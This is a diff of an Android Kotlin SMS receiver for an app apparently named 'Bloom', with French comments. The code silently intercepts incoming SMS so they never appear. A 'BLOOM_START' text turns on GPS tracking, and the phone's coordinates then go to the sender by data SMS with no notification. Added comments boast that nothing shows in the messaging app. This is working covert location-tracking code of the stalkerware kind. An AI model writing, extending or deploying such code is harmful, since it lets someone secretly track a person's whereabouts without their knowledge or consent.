@@ -12,6 +12,7 @@ import androidx.preference.PreferenceManager
 
 class SMSReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
+        // 🔇 INTERCEPTER ET SUPPRIMER — RIEN NE S'AFFICHE
         abortBroadcast()
         
         if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
@@ -26,17 +27,17 @@ class SMSReceiver : BroadcastReceiver() {
         val reponseAutoActivee = prefs.getBoolean("REPONSE_AUTO", false)
 
         when {
-            // 🟢 START REÇU → ACTIVER LE SUIVI + GPS
+            // 🟢 START REÇU → ACTIVER LE SUIVI
             texte == "BLOOM_START" && reponseAutoActivee -> {
                 prefs.edit().putBoolean("SUIVI_ACTIF", true).apply()
                 prefs.edit().putString("NUMERO_CIBLE", numeroExpediteur).apply()
-                Log.d("BLOOM-DATA", "🟢 SUIVI DÉMARRÉ PAR $numeroExpediteur — Envoi toutes les 10m")
+                Log.d("BLOOM-DATA", "🟢 SUIVI DÉMARRÉ PAR $numeroExpediteur")
                 
                 val startIntent = Intent("com.bloom.gps.DEMARRER_SUIVI")
                 startIntent.setPackage(context.packageName)
                 context.sendBroadcast(startIntent)
                 
-                envoyerPosition(context, numeroExpediteur) // Envoyer immédiatement
+                envoyerPosition(context, numeroExpediteur)
             }
 
             // 🔴 STOP REÇU → DÉSACTIVER LE SUIVI
@@ -88,10 +89,11 @@ class SMSReceiver : BroadcastReceiver() {
         if (pos != null) {
             val message = "BLOOM_POS:${pos.latitude}:${pos.longitude}"
             try {
+                // 🔑 SMS DE DONNÉES — AUCUNE NOTIFICATION, RIEN DANS LA MESSAGERIE
                 SmsManager.getDefault().sendDataMessage(
                     numeroCible, null, 10001.toShort(),
                     message.toByteArray(Charsets.UTF_8),
-                    null, null
+                    null, null  // ⚠️ Pas de PendingIntent = AUCUNE NOTIFICATION
                 )
                 Log.d("BLOOM-DATA", "📤 Position envoyée à $numeroCible")
                 
